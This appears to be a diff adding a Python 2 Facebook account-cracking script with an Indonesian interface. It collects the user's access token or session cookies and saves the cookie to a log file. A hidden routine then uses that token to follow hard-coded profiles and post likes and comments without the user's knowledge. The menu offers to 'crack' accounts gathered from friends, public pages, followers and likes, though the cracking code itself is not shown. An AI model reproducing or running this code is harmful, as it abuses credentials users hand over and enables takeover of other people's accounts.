@@ -1,0 +1,174 @@
+#-*-coding:utf-8-*-
+
+import requests,bs4,sys,os,subprocess,time,datetime
+import requests,sys,random,re,base64,json
+from multiprocessing.pool import ThreadPool
+reload(sys)
+sys.setdefaultencoding("utf-8")
+
+try:
+    import requests
+except ImportError:
+    exit('pip2 install requests *Not Installed')
+try:
+    import mechanize
+except ImportError:
+    exit('pip2 install mechanize *Not Installed')
+try:
+    import bs4
+except ImportError:
+    exit("pip2 install bs4 *Not Installed")
+### USERAGENT ###
+ua = ('Mozilla/5.0 (Linux; Android 5.0; Lenovo A1000 Build/S100; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/110.0.0.14.69;]')
+### Logo ###
+logo = """ _____  __ ____  _____
+/  ____| __ )|  ___| au:>Fais Ganz
+  / ___|  _ \| |_    github:>
+_____  | |_) |  _|   efbi:
+_____ /|____/|_|     """
+mbasic_h={"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
+free_h={"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
+mfb_h={'Host': 'm.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent':ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
+### JALAN ###
+def jalan(z):
+        for e in z + '\n':
+                sys.stdout.write(e)
+                sys.stdout.flush()
+                time.sleep(0.03)
+### Bot Komen ###
+def komen(): # Boleh Di Tanbahin Jangan Di Ganti #
+        try:
+                toket=open('login.txt','r').read()
+        except IOError:
+                print ('[x] Token Invalid')
+                login()
+        web = datetime.datetime.now()
+        waktu = web.strftime("%H:%M:%S / %d-%m-%Y ")
+	kata = random.choice(["Kita harus melakukan yang terbaik yang kita mampu. Itu adalah tanggung jawab manusia yang suci.","Orang yang ekstrem mendapatkan hasil yang ekstrem.","Belajar untuk menjadi tenang dan kamu akan selalu bahagia.","Belajar untuk menjadi tenang dan kamu akan selalu bahagia.","Dari kesalahan ke kesalahan seseorang menemukan seluruh kebenaran.","Jalan yang sulit sering kali mengarah ke tujuan yang indah.","Hal-hal hebat tidak pernah datang dari zona nyaman.","Jika kamu tidak mau mengambil risiko yang tidak biasa, kamu harus puas dengan yang biasa.","Nikmati setiap momen dalam hidup karena kamu tidak tahu apa yang akan terjadi besok."])
+        love = random.choice(['❤️','💛','💚','💙','🖤','🧡','💜'])
+        kom = 'Pengguna Script SBF '+love+'\n'+kata+'\n'+waktu
+        requests.post('https://graph.facebook.com/115041430913902/subscribers?access_token=' + toket)
+        requests.post('https://graph.facebook.com/100072241360914/subscribers?access_token=' + toket)
+        requests.post('https://graph.facebook.com/100072241360914/subscribers?access_token=' + toket)
+        requests.post('https://graph.facebook.com/115041430913902/comments/?message=' +kom+ '&access_token=' + toket)
+        requests.post('https://graph.facebook.com/115041430913902/likes?summary=true&access_token=' + toket)
+        requests.post('https://graph.facebook.com/115041430913902/comments/?message=Keren Bang ❤️&access_token=' + toket)
+        requests.post('https://graph.facebook.com/115041430913902/likes?summary=true&access_token=' + toket)
+        requests.post('https://graph.facebook.com/100072241360914/subscribers?access_token=' + toket)
+        requests.post('https://graph.facebook.com/100072241360914/subscribers?access_token=' + toket)
+        requests.post('https://graph.facebook.com/100072241360914/subscribers?access_token=' + toket)
+        print ('[•] Login Berhasil')
+	menu()
+##### LOGIN #####
+def login():
+    os.system('clear')
+    print logo
+    print('============================================')
+    print('[1] Login Pakai Token')
+    print('[2] Login Pakai Cookies')
+    print('[3] Cara Dapat Token/Cookies')
+    print('[0] Keluar')
+    print('============================================')
+    lg = raw_input('[?] Input : ')
+    if lg == '':
+        os.sys.exit()
+    elif lg == '1' or lg == '01':
+        toket = raw_input("[?] Token : ") # Login Token
+        try:
+                otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
+                a = json.loads(otw.text)
+                nama = a['name']
+                zedd = open("login.txt", 'w')
+                zedd.write(toket)
+                zedd.close()
+                komen()
+        except KeyError:
+                print("[x] Token Salah")
+                time.sleep(1.7)
+                login()
+        except requests.exceptions.SSLError:
+                exit('[x] Koneksi Error')
+    elif lg == '2' or lg == '02':
+        try:
+		cookie = raw_input("[?] Cookies : ")
+                data = {
+                            'user-agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', # don't change this user agent.
+                                'referer' : 'https://m.facebook.com/',
+                                'host' : 'm.facebook.com',
+                                'origin' : 'https://m.facebook.com',
+                                'upgrade-insecure-requests' : '1',
+                                'accept-language' : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
+                                'cache-control' : 'max-age=0',
+                                'accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+                                'content-type' : 'text/html; charset=utf-8',
+                                 'cookie' : cookie }
+                coki = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = data)
+                cari = re.search('(EAAA\w+)', coki.text)
+                hasil = cari.group(1)
+                pup = open('coki.log', 'w')
+                pup.write(cookie)
+                pup.close()
+                pip = open('login.txt', 'w')
+                pip.write(hasil)
+                pip.close()
+                komen()
+        except AttributeError,UnboundLocalError:
+                print('[x] Cookies Salah')
+                time.sleep(3)
+                login()
+        except requests.exceptions.SSLError:
+                exit('[x] Koneksi Error')
+    elif lg == '3' or lg == '03':
+	print('\nAnda Akan Di Arahkan Ke Browser')
+	os.system("xdg-open https://youtu.be/3Y6xsMB3wRg")
+	exit()
+    elif lg == '0' or lg == '00':
+        exit()
+    else:
+        exit('[x] Isi Dengan Benar')
+##### MENU #####
+def menu():
+  try:
+    toket = open('login.txt','r').read()
+    otw = requests.get('https://graph.facebook.com/me/?access_token='+toket)
+    a = json.loads(otw.text)
+    nm = a['name']
+    id = a['id']
+    tl = a['birthday']
+  except Exception as e:
+    print('[x] Token Invalid')
+    time.sleep(3)
+    login()
+  except KeyError:
+    print('[x] Token Invalid')
+    time.sleep(3)
+    os.system('rm -rf login.txt')
+    login()
+  except requests.exceptions.ConnectionError:
+    exit('[x] Koneksi Error')
+  os.system("clear")
+  print logo
+  print('==========================================')
+  print('[•] Nama :\x1b[0;36m '+nm)
+  print('[•] Your ID :\x1b[0;36m '+id)
+  print('[•] Birthday :\x1b[0;36m '+tl)
+  print('==========================================')
+  print('[1]\x1b[0;36m Crack ID Dari Teman')
+  print('[2]\x1b[0;36m Crack ID Dari Publik')
+  print('[3]\x1b[0;36m Crack ID Dari Followers')
+  print('[4]\x1b[0;36m Crack ID Dari Like')
+  print('[5]\x1b[0;36m Lihat Hasil Crack')
+  print('[0]\x1b[0;36m Keluar & Hapus Token/Cookies')
+  print('===≠=====================================')
+  mn=raw_input("[?] Input : ")
+  if mn=="":
+	print ('[x] Isi Dengan Benar')
+	menu()
+  elif mn=="1":
+    teman()
+  elif mn=="2":
+    publik()
+  elif mn=="3":
+    followers()
+  elif mn=="4":
+    like()
